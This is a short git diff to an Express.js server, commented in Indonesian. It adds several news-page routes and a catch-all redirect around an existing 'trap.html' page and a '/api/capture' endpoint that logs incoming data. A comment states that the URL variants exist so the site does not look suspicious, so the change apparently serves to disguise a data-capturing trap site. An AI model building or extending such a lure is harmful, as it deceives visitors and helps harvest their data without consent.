@@ -39,6 +39,29 @@ app.get("/demo", (req, res) => {
   res.sendFile(path.join(__dirname, "public", "trap.html"));
 });
 
+// Serve halaman berita setelah redirect
+app.get("/berita", (req, res) => {
+  res.sendFile(path.join(__dirname, "public", "berita.html"));
+});
+
+// Serve halaman berita dengan berbagai variasi URL agar tidak mencurigakan
+app.get("/artikel", (req, res) => {
+  res.sendFile(path.join(__dirname, "public", "berita.html"));
+});
+
+app.get("/news", (req, res) => {
+  res.sendFile(path.join(__dirname, "public", "berita.html"));
+});
+
+app.get("/berita-terkini", (req, res) => {
+  res.sendFile(path.join(__dirname, "public", "berita.html"));
+});
+
+// Handle semua request yang tidak ditemukan (404) redirect ke berita
+app.use((req, res) => {
+  res.redirect('/berita');
+});
+
 // API untuk menerima data - PERBAIKI ENDPOINT INI
 app.post("/api/capture", (req, res) => {
   console.log("📥 Data received:", req.body);
